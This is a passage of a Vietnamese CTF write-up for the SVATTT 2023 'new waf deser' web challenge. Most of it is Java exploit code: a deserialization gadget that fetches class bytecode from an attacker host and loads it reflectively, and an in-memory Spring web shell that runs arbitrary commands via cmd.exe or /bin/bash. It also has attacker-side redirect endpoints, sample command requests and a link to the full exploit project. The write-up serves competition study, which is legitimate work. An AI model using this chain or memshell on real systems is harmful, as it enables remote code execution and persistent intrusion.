</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">downloadUsingStream</span><span style="color:#f92672">(</span>String urlStr<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        URL url <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL<span style="color:#f92672">(</span>urlStr<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        java<span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">BufferedInputStream</span> bis <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">BufferedInputStream</span><span style="color:#f92672">(</span>url<span style="color:#f92672">.</span><span style="color:#a6e22e">openStream</span><span style="color:#f92672">());</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> classBytecode <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>bis<span style="color:#f92672">.</span><span style="color:#a6e22e">available</span><span style="color:#f92672">()];</span>
</span></span><span style="display:flex;"><span>        bis<span style="color:#f92672">.</span><span style="color:#a6e22e">read</span><span style="color:#f92672">(</span>classBytecode<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        bis<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> classBytecode<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Class <span style="color:#a6e22e">loader</span><span style="color:#f92672">(</span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytes<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        URLClassLoader classLoader <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URLClassLoader<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> URL<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">],</span> Thread<span style="color:#f92672">.</span><span style="color:#a6e22e">currentThread</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getContextClassLoader</span><span style="color:#f92672">());</span>
</span></span><span style="display:flex;"><span>        java<span style="color:#f92672">.</span><span style="color:#a6e22e">lang</span><span style="color:#f92672">.</span><span style="color:#a6e22e">reflect</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Method</span> method <span style="color:#f92672">=</span> ClassLoader<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredMethod</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;defineClass&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[].</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        method<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">(</span>Class<span style="color:#f92672">)</span> method<span style="color:#f92672">.</span><span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span>classLoader<span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]{</span>bytes<span style="color:#f92672">,</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">,</span> bytes<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">});</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">ProxyTemplatesImpl</span><span style="color:#f92672">()</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>        String callback <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://front:5000/http://10.1.xx.93:8082/proxy/MemTemplatesImpl&#34;</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> memBytecode <span style="color:#f92672">=</span> downloadUsingStream<span style="color:#f92672">(</span>callback<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        loader<span style="color:#f92672">(</span>memBytecode<span style="color:#f92672">).</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>RequestMapping t∆∞∆°ng ·ª©ng:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// exploit from front
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">@RequestMapping</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/tiktikboom&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@ResponseBody</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ticket</span><span style="color:#f92672">(</span>HttpServletResponse httpServletResponse<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>         System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Received request: /tiktikboom&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        String exploitBackendURL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://back/ticket/&#34;</span> <span style="color:#f92672">+</span> ExploitUtils<span style="color:#f92672">.</span><span style="color:#a6e22e">genDeserPayload</span><span style="color:#f92672">()</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;?compress=true&#34;</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>        httpServletResponse<span style="color:#f92672">.</span><span style="color:#a6e22e">setHeader</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Location&#34;</span><span style="color:#f92672">,</span> exploitBackendURL<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        httpServletResponse<span style="color:#f92672">.</span><span style="color:#a6e22e">setStatus</span><span style="color:#f92672">(</span><span style="color:#ae81ff">301</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span></code></pre></div><p><code>MemTemplatesImpl</code> ƒë∆∞·ª£c request ƒë·∫øn v√† load sau khi deser l·∫ßn 1:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MemTemplatesImpl</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">MemTemplatesImpl</span><span style="color:#f92672">()</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>        WebApplicationContext context <span style="color:#f92672">=</span> RequestContextUtils<span style="color:#f92672">.</span><span style="color:#a6e22e">findWebApplicationContext</span><span style="color:#f92672">(((</span>ServletRequestAttributes<span style="color:#f92672">)</span> RequestContextHolder<span style="color:#f92672">.</span><span style="color:#a6e22e">getRequestAttributes</span><span style="color:#f92672">()).</span><span style="color:#a6e22e">getRequest</span><span style="color:#f92672">());</span>
</span></span><span style="display:flex;"><span>        RequestMappingHandlerMapping mappingHandler <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span><span style="color:#a6e22e">getBean</span><span style="color:#f92672">(</span>RequestMappingHandlerMapping<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        Method method <span style="color:#f92672">=</span> MemTemplatesImpl<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getMethod</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;run&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        Method getMappingForMethod <span style="color:#f92672">=</span> mappingHandler<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getDeclaredMethod</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;getMappingForMethod&#34;</span><span style="color:#f92672">,</span> Method<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        getMappingForMethod<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        RequestMappingInfo mInfo <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>RequestMappingInfo<span style="color:#f92672">)</span> getMappingForMethod<span style="color:#f92672">.</span><span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span>mappingHandler<span style="color:#f92672">,</span> method<span style="color:#f92672">,</span> MemTemplatesImpl<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        MemTemplatesImpl obj <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> MemTemplatesImpl<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        mappingHandler<span style="color:#f92672">.</span><span style="color:#a6e22e">registerMapping</span><span style="color:#f92672">(</span>mInfo<span style="color:#f92672">,</span> obj<span style="color:#f92672">,</span> method<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">MemTemplatesImpl</span><span style="color:#f92672">(</span>String a<span style="color:#f92672">)</span> <span style="color:#f92672">{}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@RequestMapping</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/a/ayooo&#34;</span><span style="color:#f92672">)</span> <span style="color:#75715e">// memshell path
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">run</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            HttpServletRequest request <span style="color:#f92672">=</span> <span style="color:#f92672">((</span>ServletRequestAttributes<span style="color:#f92672">)</span>RequestContextHolder<span style="color:#f92672">.</span><span style="color:#a6e22e">currentRequestAttributes</span><span style="color:#f92672">()).</span><span style="color:#a6e22e">getRequest</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>            HttpServletResponse response <span style="color:#f92672">=</span> <span style="color:#f92672">((</span>ServletRequestAttributes<span style="color:#f92672">)</span>RequestContextHolder<span style="color:#f92672">.</span><span style="color:#a6e22e">currentRequestAttributes</span><span style="color:#f92672">()).</span><span style="color:#a6e22e">getResponse</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            String arg0 <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span><span style="color:#a6e22e">getParameter</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;devme_63hdsbx&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>arg0 <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                ProcessBuilder p<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>                String o <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>                PrintWriter w <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span><span style="color:#a6e22e">getWriter</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>System<span style="color:#f92672">.</span><span style="color:#a6e22e">getProperty</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;os.name&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toLowerCase</span><span style="color:#f92672">().</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;win&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                    p <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ProcessBuilder<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]{</span><span style="color:#e6db74">&#34;cmd.exe&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;/c&#34;</span><span style="color:#f92672">,</span> arg0<span style="color:#f92672">});</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                    p <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ProcessBuilder<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]{</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;-c&#34;</span><span style="color:#f92672">,</span> arg0<span style="color:#f92672">});</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>                java<span style="color:#f92672">.</span><span style="color:#a6e22e">util</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Scanner</span> c <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> java<span style="color:#f92672">.</span><span style="color:#a6e22e">util</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Scanner</span><span style="color:#f92672">(</span>p<span style="color:#f92672">.</span><span style="color:#a6e22e">start</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getInputStream</span><span style="color:#f92672">()).</span><span style="color:#a6e22e">useDelimiter</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\\A&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                o <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span><span style="color:#a6e22e">hasNext</span><span style="color:#f92672">()</span> <span style="color:#f92672">?</span> c<span style="color:#f92672">.</span><span style="color:#a6e22e">next</span><span style="color:#f92672">()</span> <span style="color:#f92672">:</span> o<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>                c<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>                w<span style="color:#f92672">.</span><span style="color:#a6e22e">write</span><span style="color:#f92672">(</span>o<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                w<span style="color:#f92672">.</span><span style="color:#a6e22e">flush</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>                w<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                response<span style="color:#f92672">.</span><span style="color:#a6e22e">sendError</span><span style="color:#f92672">(</span><span style="color:#ae81ff">404</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">)</span> <span style="color:#f92672">{}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>RequestMapping t∆∞∆°ng ·ª©ng:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// callback
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">@RequestMapping</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/proxy/MemTemplatesImpl&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@ResponseBody</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> ByteArrayResource <span style="color:#a6e22e">proxy</span><span style="color:#f92672">()</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Received callback request: /proxy/MemTemplatesImpl&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        Path path <span style="color:#f92672">=</span> Paths<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>getClass<span style="color:#f92672">().</span><span style="color:#a6e22e">getResource</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/evil/MemTemplatesImpl.class&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toURI</span><span style="color:#f92672">());</span>
</span></span><span style="display:flex;"><span>        ByteArrayResource resource <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayResource<span style="color:#f92672">(</span>Files<span style="color:#f92672">.</span><span style="color:#a6e22e">readAllBytes</span><span style="color:#f92672">(</span>path<span style="color:#f92672">));</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> resource<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span></code></pre></div><p>Sau khi load th√¨ code ti·∫øp route redirect ƒë·∫øn mem:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// run memshell from front
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">@RequestMapping</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/memshell&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@ResponseBody</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">proxy</span><span style="color:#f92672">(</span><span style="color:#a6e22e">@RequestHeader</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;cmd4f&#34;</span><span style="color:#f92672">)</span> String cmd4f<span style="color:#f92672">,</span> HttpServletResponse httpServletResponse<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        String exploitBackendURL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://back/a/ayooo?devme_63hdsbx=&#34;</span> <span style="color:#f92672">+</span> URLEncoder<span style="color:#f92672">.</span><span style="color:#a6e22e">encode</span><span style="color:#f92672">(</span>cmd4f<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;utf-8&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        httpServletResponse<span style="color:#f92672">.</span><span style="color:#a6e22e">setHeader</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Location&#34;</span><span style="color:#f92672">,</span> exploitBackendURL<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        httpServletResponse<span style="color:#f92672">.</span><span style="color:#a6e22e">setStatus</span><span style="color:#f92672">(</span><span style="color:#ae81ff">301</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span></code></pre></div><p><strong>Request</strong>: <code>http://ubuntu.lab:8004/http://10.1.xx.93:8082/tiktikboom</code>
<strong>HttpServer Log</strong>:
<img src="/images/2023/SVATTT-2023_new-waf-deser/HttpServerLog.png" alt="HttpServerLog"></p>
<p><strong>Request</strong>:</p>
<pre tabindex="0"><code>GET http://ubuntu.lab:8004/http://10.1.xx.93:8082/memshell
User-Agent: 123
cmd4f: ls
</code></pre><p><strong>Response</strong>:
<img src="/images/2023/SVATTT-2023_new-waf-deser/req_exploit.png" alt="req_exploit"></p>
<p>Full project ƒë·ªÉ exploit m√¨nh c√≥ push l√™n t·∫°i ƒë√¢y:  <a href="https://github.com/devme4f/SVATTT-2023_web02">https://github.com/devme4f/SVATTT-2023_web02</a></p>
<h2 id="anotherway-spring-view-manipulation-ssti-still-via-deser">Anotherway: Spring View Manipulation (SSTI) still, via deser</h2>
<p>N·∫øu c·ª© chƒÉm chƒÉm ph·∫ßn deser c√≥ khi m·ªçi ng∆∞·ªùi c≈©ng d·ªÖ miss bug n√†y. V√¨ ch∆∞a c√≥ th·ªùi gian n√™n ch∆∞a poc l·∫°i. C√≥ th·ªÉ th·∫•y l√† <code>back</code> d√πng <code>thymleaf</code>:
<img src="/images/2023/SVATTT-2023_new-waf-deser/pom_xml.png" alt="pom_xml"></p>
<p>Sau khi deser th√†nh class <code>User</code> th√¨ <code>role</code> ƒë∆∞·ª£c n·ªëi th·∫≥ng v√†o return String c·ªßa <code>RequestMapping</code>:
<img src="/images/2023/SVATTT-2023_new-waf-deser/ssti_spring.png" alt="ssti_spring"></p>
<p>==&gt; <strong>Spring View Manipulation</strong></p>

    </div>
  </article>

  
  






  <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/posts">Archives</a></li>
         
          <li><a href="/about">About</a></li>
        
      </ul>
    </div>

    
    <div id="toc-footer" style="display: none">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#preface">Preface</a></li>
    <li><a href="#docker-composeyml">docker-compose.yml</a></li>
    <li><a href="#de-old-backend">de old backend</a></li>
    <li><a href="#de-front">de front</a></li>
    <li><a href="#deser">deser</a></li>
    <li><a href="#anotherway-spring-view-manipulation-ssti-still-via-deser">Anotherway: Spring View Manipulation (SSTI) still, via deser</a></li>
  </ul>
</nav>
    </div>
    

    <div id="share-footer" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f" aria-label="Facebook">
      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&text=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser" aria-label="Twitter">
      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&title=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser" aria-label="Linkedin">
      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&is_video=false&description=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser" aria-label="Pinterest">
      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f" aria-label="Email">
      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&title=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser" aria-label="Pocket">
      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&title=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser" aria-label="reddit">
      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&name=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser&description=Preface%20G%c3%b5%20ph%c3%adm%20vi%e1%ba%bft%20b%c3%a0i%20n%c3%a0y%20th%c3%ac%20c%c5%a9ng%20%c4%91%c3%a3%20g%e1%ba%a7n%202%20th%c3%a1ng%20k%e1%bb%83%20t%e1%bb%ab%20%c4%91%e1%bb%a3t%20final%20A%26amp%3bD%20SVATTT%202023%20k%e1%ba%bft%20th%c3%bac.%20N%c4%83m%20nay%20m%c3%acnh%20may%20may%20m%e1%ba%afn%20%c4%91%c6%b0%e1%bb%a3c%20v%c3%a0o%20chung%20kh%e1%ba%a3o%20ch%c6%a1i%20A%26amp%3bD%20v%c3%a0%20v%e1%bb%9bi%20role%20l%c3%a0%20defense%20%28c%e1%ba%a5u%20h%c3%acnh%20log%2c%20patch%20bug%2c..etc%29.%20V%c3%a0o%20thi%20th%c3%ac%20kh%c3%a1%20lo%e1%ba%a1n%20%2b%20nhi%e1%bb%81u%20vi%e1%bb%87c%2c%20v%c3%a0%20v%c3%ac%20m%c3%acnh%20role%20defense%20n%c3%aan%20c%c5%a9ng%20ch%e1%bb%89%20ng%c3%b3%20qua%20b%c3%a0i%20n%c3%a0y%20v%c3%a0%20th%e1%ba%a5y%20backend%20y%20chang%20b%c3%a0i%20waf-deser%20n%c4%83m%20tr%c6%b0%e1%bb%9bc%20kh%c3%a1c%20m%e1%bb%97i%20ph%e1%ba%a7n%20front-end%2c%20t%c6%b0%e1%bb%9fng%20d%e1%bb%85%20n%c3%aan%20m%c3%acnh%20v%e1%ba%abn%20ch%c6%b0a%20m%c3%b2%20l%e1%ba%a1i%20xem%2c%20nay%20%c4%91%e1%ba%bfn%20deadline%20ho%c3%a0n%20th%c3%a0nh%20task%20%e1%bb%9f%20clb%20m%e1%bb%9bi%20l%e1%bb%a5i%20c%e1%bb%a5i%20l%c3%a0m%2c%20th%e1%ba%a5y%20hay%20n%c3%aan%20write%20up%20l%e1%ba%a1i%20lu%c3%b4n%2c%20coi%20nh%c6%b0%20l%c3%a0m%20t%c3%a0i%20li%e1%bb%87u%20tham%20kh%e1%ba%a3o%20cho%20c%c3%a1c%20n%c4%83m%20sau%20%3aD" aria-label="Tumblr">
      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&t=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser" aria-label="Hacker News">
      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>

    <div id="actions-footer">
      
        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
